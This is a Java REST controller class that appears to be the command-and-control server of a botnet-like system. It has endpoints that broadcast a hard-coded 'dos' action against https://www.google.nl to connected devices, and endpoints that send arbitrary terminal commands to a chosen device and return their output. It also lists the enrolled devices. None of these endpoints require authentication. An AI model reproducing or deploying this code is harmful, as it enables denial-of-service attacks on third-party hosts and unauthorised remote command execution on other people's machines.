package nl.mdtvs.rest;

import java.io.IOException;
import java.io.PrintWriter;
import javax.inject.Inject;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.FormParam;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.PathParam;
import javax.ws.rs.Produces;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.MediaType;
import javax.xml.bind.JAXBException;
import nl.mdtvs.models.Message;
import nl.mdtvs.util.ConvertObject;
import nl.mdtvs.util.ObservedObject;
import nl.mdtvs.websocket.SessionHandler;

@Path("/action")
public class ActionBoundary {

    @Inject
    private SessionHandler sh;

    @POST
    public void sendActionMessage() throws JAXBException, IOException {
        sh.sendAction(new Message("dos", "https://www.google.nl"));
    }

    @POST
    @Path("/terminal/{session}")
    public void sendTerminalMessage(@PathParam("session") String session, @FormParam("command") String command) throws JAXBException, IOException {
        sh.sendAction(session, new Message("terminal", command));
    }

    @GET
    @Path("terminal/{session}")
    public String getTerminalResponse(@PathParam("session") String session) throws JAXBException, IOException {
        String response = sh.getDevice(session).getTerminalResponse();
        sh.getDevice(session).setTerminalResponse("");
        return response;
    }

    @GET
    @Path("/devices")
    @Produces(MediaType.APPLICATION_JSON)
    public String getConnectedDevices() throws IOException {
        return ConvertObject.devicesToJson(sh.getDevices());
    }

    @GET
    @Path("/devices/{session}")
    @Produces(MediaType.APPLICATION_JSON)
    public String getConnectedDevice(@PathParam("session") String sessionid) throws IOException {
        return ConvertObject.deviceToJson(sh.getDevice(sessionid));
    }

    private ObservedObject deviceListObs;
    
    @GET
    @Path("event")
    public void ChangeListener(@Context HttpServletRequest request, @Context HttpServletResponse response) throws IOException, InterruptedException {
        deviceListObs = ObservedObject.getInstance();
        if(!deviceListObs.hasWatchValue()) deviceListObs.setWatcher(sh.getDevices());
        PrintWriter out = response.getWriter();
        response.setContentType("text/event-stream, charset=UTF-8");
        deviceListObs.setValue(sh.getDevices());
        
        if(deviceListObs.hasChanged()){
            out.print("event: updateClients\n");
            out.print("data: updateClients\n\n");
            deviceListObs.clearChanged();
        }
        out.print("retry: 300\n");
        out.flush();
    }
}
